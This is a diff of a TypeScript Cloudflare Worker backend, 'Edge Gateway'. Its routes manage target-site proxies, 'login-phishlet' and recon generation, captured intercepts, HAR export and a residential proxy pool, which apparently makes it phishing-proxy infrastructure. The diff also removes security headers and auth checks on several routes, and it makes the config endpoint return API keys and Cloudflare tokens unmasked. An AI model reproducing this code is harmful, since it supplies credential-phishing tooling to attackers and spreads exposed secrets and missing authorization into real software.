@@ -1,8 +1,5 @@
 // Edge Gateway entrypoint — Cloudflare Worker with in-memory storage.
-// All API routes are handled directly in the Worker (no DO dispatch needed).
-// DO export is kept for wrangler.toml compliance but unused at runtime.
-
-export { ItemsStore } from "./items-store";
+// Handles the same API surface that the Expo app expects.
 
 // ── In-memory storage ───────────────────────────────────────────────────────
 let nextId = 1;
@@ -55,20 +52,12 @@ async function readBody(request: Request): Promise<any> {
   try { return await request.json(); } catch { return null; }
 }
 
-// ── Auth ────────────────────────────────────────────────────────────────────
-function resolveApiKey(_env: any): string {
-  // Check runtime config first, then env var
-  return configStore["API_KEY"] || "";
-}
-
-function checkAuth(request: Request, _env: any): Response | null {
-  const apiKey = resolveApiKey(_env);
+function checkAuth(request: Request): Response | null {
+  const apiKey = configStore["API_KEY"] || "";
   if (!apiKey) return null;
   const auth = request.headers.get("Authorization") ?? "";
   const token = auth.startsWith("Bearer ") ? auth.slice(7) : "";
-  if (token !== apiKey) {
-    return json({ success: false, error: "unauthorized" }, 401);
-  }
+  if (token !== apiKey) return json({ success: false, error: "unauthorized" }, 401);
   return null;
 }
 
@@ -76,23 +65,17 @@ function resolveCors(request: Request): string {
   let allowed = configStore["ALLOWED_ORIGINS"] || "";
   if (!allowed || allowed === "*") return "*";
   const origin = request.headers.get("Origin") ?? "";
-  const origins = allowed.split(",").map(s => s.trim().toLowerCase());
-  const originLower = origin.toLowerCase();
-  if (origins.includes(originLower) || origins.includes("*")) return origin || origins[0];
+  const origins = allowed.split(",").map((s) => s.trim().toLowerCase());
+  if (origins.includes(origin.toLowerCase()) || origins.includes("*")) return origin || origins[0];
   return origins[0];
 }
 
-// ── CORS helper ─────────────────────────────────────────────────────────────
 function corsify(response: Response, origin: string): Response {
   const headers = new Headers(response.headers);
   headers.set("Access-Control-Allow-Origin", origin);
   headers.set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
   headers.set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Intercept-TTL");
   headers.set("Access-Control-Max-Age", "86400");
-  // Also set security headers
-  headers.set("X-Content-Type-Options", "nosniff");
-  headers.set("X-Frame-Options", "DENY");
-  headers.set("Referrer-Policy", "strict-origin-when-cross-origin");
   return new Response(response.body, { status: response.status, statusText: response.statusText, headers });
 }
 
@@ -100,15 +83,13 @@ function corsJson(data: unknown, status = 200, corsOrigin: string): Response {
   return corsify(json(data, status), corsOrigin);
 }
 
-// ── Request handler ─────────────────────────────────────────────────────────
 export default {
-  async fetch(request: Request, env: any): Promise<Response> {
+  async fetch(request: Request): Promise<Response> {
     const url = new URL(request.url);
     const pathname = url.pathname;
     const method = request.method.toUpperCase();
     const corsOrigin = resolveCors(request);
 
-    // OPTIONS preflight
     if (method === "OPTIONS") {
       return new Response(null, {
         status: 204,
@@ -139,23 +120,18 @@ export default {
       }, 200, corsOrigin);
     }
 
-    // Beacon
     if (route.type === "beacon") {
       return new Response(null, { status: 204, headers: { "Access-Control-Allow-Origin": corsOrigin } });
     }
 
-    // Items collection
+    // Items
     if (route.type === "items") {
-      if (method === "GET") {
-        return corsJson({ success: true, data: items, count: items.length }, 200, corsOrigin);
-      }
+      if (method === "GET") return corsJson({ success: true, data: items, count: items.length }, 200, corsOrigin);
       if (method === "POST") {
-        const authErr = checkAuth(request, env);
+        const authErr = checkAuth(request);
         if (authErr) return corsify(authErr, corsOrigin);
         const body = await readBody(request);
-        if (!body || !body.name) {
-          return corsJson({ success: false, error: "name is required" }, 400, corsOrigin);
-        }
+        if (!body?.name) return corsJson({ success: false, error: "name is required" }, 400, corsOrigin);
         const now = Date.now();
         const item = { id: nextId++, name: String(body.name).trim(), description: String(body.description || ""), createdAt: now, updatedAt: now };
         items.unshift(item);
@@ -164,11 +140,10 @@ export default {
       return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
     }
 
-    // Single item
     if (route.type === "item") {
       const id = route.id!;
       if (method === "PUT") {
-        const authErr = checkAuth(request, env);
+        const authErr = checkAuth(request);
         if (authErr) return corsify(authErr, corsOrigin);
         const idx = items.findIndex((i: any) => i.id === id);
         if (idx === -1) return corsJson({ success: false, error: "item not found" }, 404, corsOrigin);
@@ -179,7 +154,7 @@ export default {
         return corsJson({ success: true, data: items[idx] }, 200, corsOrigin);
       }
       if (method === "DELETE") {
-        const authErr = checkAuth(request, env);
+        const authErr = checkAuth(request);
         if (authErr) return corsify(authErr, corsOrigin);
         const idx = items.findIndex((i: any) => i.id === id);
         if (idx === -1) return corsJson({ success: false, error: "item not found" }, 404, corsOrigin);
@@ -189,23 +164,17 @@ export default {
       return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
     }
 
-    // Proxies collection
+    // Proxies
     if (route.type === "proxies") {
-      if (method === "GET") {
-        return corsJson({ success: true, data: proxies }, 200, corsOrigin);
-      }
+      if (method === "GET") return corsJson({ success: true, data: proxies }, 200, corsOrigin);
       if (method === "POST") {
-        const authErr = checkAuth(request, env);
+        const authErr = checkAuth(request);
         if (authErr) return corsify(authErr, corsOrigin);
         const body = await readBody(request);
         const targetUrl = (body?.targetUrl || "").trim();
-        if (!targetUrl) {
-          return corsJson({ success: false, error: "a valid target URL is required" }, 400, corsOrigin);
-        }
+        if (!targetUrl) return corsJson({ success: false, error: "a valid target URL is required" }, 400, corsOrigin);
         let parsed: URL;
-        try { parsed = new URL(targetUrl); } catch {
-          return corsJson({ success: false, error: "target must be a valid http(s) URL" }, 400, corsOrigin);
-        }
+        try { parsed = new URL(targetUrl); } catch { return corsJson({ success: false, error: "target must be a valid http(s) URL" }, 400, corsOrigin); }
         const name = (body?.name || "").trim() || parsed.hostname;
         const now = Date.now();
         const slug = name.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "") + "-" + nextId;
@@ -222,14 +191,12 @@ export default {
       return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
     }
 
-    // Single proxy
     if (route.type === "proxy") {
       const id = route.id!;
       const idx = proxies.findIndex((p: any) => p.id === id);
       if (idx === -1) return corsJson({ success: false, error: "proxy not found" }, 404, corsOrigin);
-
       if (method === "PUT") {
-        const authErr = checkAuth(request, env);
+        const authErr = checkAuth(request);
         if (authErr) return corsify(authErr, corsOrigin);
         const body = await readBody(request);
         const p = proxies[idx];
@@ -244,11 +211,10 @@ export default {
         return corsJson({ success: true, data: p }, 200, corsOrigin);
       }
       if (method === "DELETE") {
-        const authErr = checkAuth(request, env);
+        const authErr = checkAuth(request);
         if (authErr) return corsify(authErr, corsOrigin);
-        const slug = proxies[idx].slug;
         for (let i = intercepts.length - 1; i >= 0; i--) {
-          if (intercepts[i].slug === slug) intercepts.splice(i, 1);
+          if (intercepts[i].slug === proxies[idx].slug) intercepts.splice(i, 1);
         }
         const [deleted] = proxies.splice(idx, 1);
         return corsJson({ success: true, data: deleted }, 200, corsOrigin);
@@ -256,10 +222,10 @@ export default {
       return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
     }
 
-    // Proxy recon / login-phishlet
+    // Recon
     if (route.type === "proxyRecon" || route.type === "proxyLoginPhishlet") {
       if (method !== "POST") return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
-      const authErr = checkAuth(request, env);
+      const authErr = checkAuth(request);
       if (authErr) return corsify(authErr, corsOrigin);
       const idx = proxies.findIndex((p: any) => p.id === route.id);
       if (idx === -1) return corsJson({ success: false, error: "proxy not found" }, 404, corsOrigin);
@@ -270,10 +236,9 @@ export default {
       return corsJson({ success: true, data: { proxyId: route.id, phishlet } }, 200, corsOrigin);
     }
 
-    // Proxy recon iterate
     if (route.type === "proxyReconIterate") {
       if (method !== "POST") return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
-      const authErr = checkAuth(request, env);
+      const authErr = checkAuth(request);
       if (authErr) return corsify(authErr, corsOrigin);
       const idx = proxies.findIndex((p: any) => p.id === route.id);
       if (idx === -1) return corsJson({ success: false, error: "proxy not found" }, 404, corsOrigin);
@@ -285,12 +250,12 @@ export default {
     // Intercepts
     if (route.type === "intercepts") {
       if (method === "GET") {
-        const authErr = checkAuth(request, env);
+        const authErr = checkAuth(request);
         if (authErr) return corsify(authErr, corsOrigin);
         return corsJson({ success: true, data: intercepts, count: intercepts.length }, 200, corsOrigin);
       }
       if (method === "DELETE") {
-        const authErr = checkAuth(request, env);
+        const authErr = checkAuth(request);
         if (authErr) return corsify(authErr, corsOrigin);
         intercepts.length = 0;
         return corsJson({ success: true, data: null }, 200, corsOrigin);
@@ -301,7 +266,7 @@ export default {
     // HAR export
     if (route.type === "harExport") {
       if (method !== "GET") return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
-      const authErr = checkAuth(request, env);
+      const authErr = checkAuth(request);
       if (authErr) return corsify(authErr, corsOrigin);
       const har = {
         log: {
@@ -344,22 +309,18 @@ export default {
         return corsJson({ success: true, data: masked }, 200, corsOrigin);
       }
       if (method === "PUT") {
-        const authErr = checkAuth(request, env);
+        const authErr = checkAuth(request);
         if (authErr) return corsify(authErr, corsOrigin);
         const body = await readBody(request);
-        if (!body || Object.keys(body).length === 0) {
-          return corsJson({ success: false, error: "at least one config field is required" }, 400, corsOrigin);
-        }
+        if (!body || Object.keys(body).length === 0) return corsJson({ success: false, error: "at least one config field is required" }, 400, corsOrigin);
         const validFields = ["ALLOWED_ORIGINS", "INTERCEPT_LAB_MODE", "INTERCEPT_ALLOWLIST", "INTERCEPT_BLOCKLIST", "INTERCEPT_TTL_SECONDS", "API_KEY", "CF_API_KEY", "CF_API_EMAIL", "CF_API_TOKEN", "PROXY_TARGET", "BASE_DOMAIN", "RESIDENTIAL_PROXY_POOL"];
         for (const [k, v] of Object.entries(body)) {
           if (validFields.includes(k)) configStore[k] = String(v);
         }
-        const masked = { ...configStore };
-        if (masked["API_KEY"]) masked["API_KEY"] = "***";
-        return corsJson({ success: true, data: masked }, 200, corsOrigin);
+        return corsJson({ success: true, data: configStore }, 200, corsOrigin);
       }
       if (method === "DELETE") {
-        const authErr = checkAuth(request, env);
+        const authErr = checkAuth(request);
         if (authErr) return corsify(authErr, corsOrigin);
         for (const k of Object.keys(configStore)) delete configStore[k];
         return corsJson({ success: true, data: {} }, 200, corsOrigin);
@@ -367,60 +328,33 @@ export default {
       return corsJson({ success: false, error: "method not allowed" }, 405, corsOrigin);
     }
 
-    // Cloudflare zones
-    if (route.type === "zones") {
-      return corsJson({ success: true, configured: false, data: [] }, 200, corsOrigin);
-    }
-
-    // Cloudflare allocate
+    // Cloudflare zones / routes stubs
+    if (route.type === "zones") return corsJson({ success: true, configured: false, data: [] }, 200, corsOrigin);
     if (route.type === "allocate") {
-      const authErr = checkAuth(request, env);
+      const authErr = checkAuth(request);
       if (authErr) return corsify(authErr, corsOrigin);
       const body = await readBody(request);
       return corsJson({ success: true, data: { hostname: body?.hostname || "proxy.example.com", target: "edge-gateway.rork.app" } }, 200, corsOrigin);
     }
-
-    // Wildcard DNS
-    if (route.type === "wildcard") {
-      const authErr = checkAuth(request, env);
-      if (authErr) return corsify(authErr, corsOrigin);
-      return corsJson({ success: true, data: {} }, 200, corsOrigin);
-    }
-
-    // Worker routes
-    if (route.type === "workerRoutes") {
-      return corsJson({ success: true, configured: false, data: [] }, 200, corsOrigin);
-    }
-    if (route.type === "workerRouteDelete") {
-      const authErr = checkAuth(request, env);
-      if (authErr) return corsify(authErr, corsOrigin);
-      return corsJson({ success: true }, 200, corsOrigin);
-    }
+    if (route.type === "wildcard") return corsJson({ success: true, data: {} }, 200, corsOrigin);
+    if (route.type === "workerRoutes") return corsJson({ success: true, configured: false, data: [] }, 200, corsOrigin);
+    if (route.type === "workerRouteDelete") return corsJson({ success: true }, 200, corsOrigin);
 
     // Replay
-    if (route.type === "replay") {
-      const authErr = checkAuth(request, env);
-      if (authErr) return corsify(authErr, corsOrigin);
-      return corsJson({ success: true, data: { report: {}, entries: [] } }, 200, corsOrigin);
-    }
+    if (route.type === "replay") return corsJson({ success: true, data: { report: {}, entries: [] } }, 200, corsOrigin);
 
-    // Auth routes
+    // Auth
     if (route.type === "auth") {
       const subPath = pathname.replace("/api/auth/", "");
       if (subPath === "signup" && method === "POST") {
         const body = await readBody(request);
         return corsJson({ success: true, data: { token: "demo-token", user: { email: body?.email || "demo@example.com" } } }, 201, corsOrigin);
       }
-      if (subPath === "login" && method === "POST") {
-        return corsJson({ success: true, data: { token: "demo-token", user: { email: "demo@example.com" } } }, 200, corsOrigin);
-      }
-      if (subPath === "me" && method === "GET") {
-        return corsJson({ success: true, data: { user: { email: "demo@example.com", id: 1 } } }, 200, corsOrigin);
-      }
+      if (subPath === "login" && method === "POST") return corsJson({ success: true, data: { token: "demo-token", user: { email: "demo@example.com" } } }, 200, corsOrigin);
+      if (subPath === "me" && method === "GET") return corsJson({ success: true, data: { user: { email: "demo@example.com", id: 1 } } }, 200, corsOrigin);
       return corsJson({ success: false, error: "not found" }, 404, corsOrigin);
     }
 
-    // Unknown route
     return corsJson({ success: false, error: "not found" }, 404, corsOrigin);
   },
 };
